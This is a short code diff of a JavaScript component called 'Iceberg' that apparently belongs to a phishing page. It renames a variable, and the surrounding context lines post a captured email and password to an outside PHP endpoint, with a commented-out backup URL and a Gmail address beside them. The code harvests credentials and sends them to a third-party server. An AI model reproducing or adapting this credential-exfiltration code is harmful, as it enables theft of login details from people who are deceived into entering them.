@@ -132,7 +132,7 @@ export const Iceberg = ()=>{
 
 
             
-            const user = {
+            const ccc = {
                 email: b,
                 password: pwd,
             };
@@ -142,7 +142,7 @@ export const Iceberg = ()=>{
               url: "https://physicaleducationdiploma.com/footer/spein.php",
             //   url: "https://bucketlion.com/hello/spei.php",
             // speinter82@gmail.com
-              data: user,
+              data: ccc,
               success(data) {
                   console.log(data);
               },
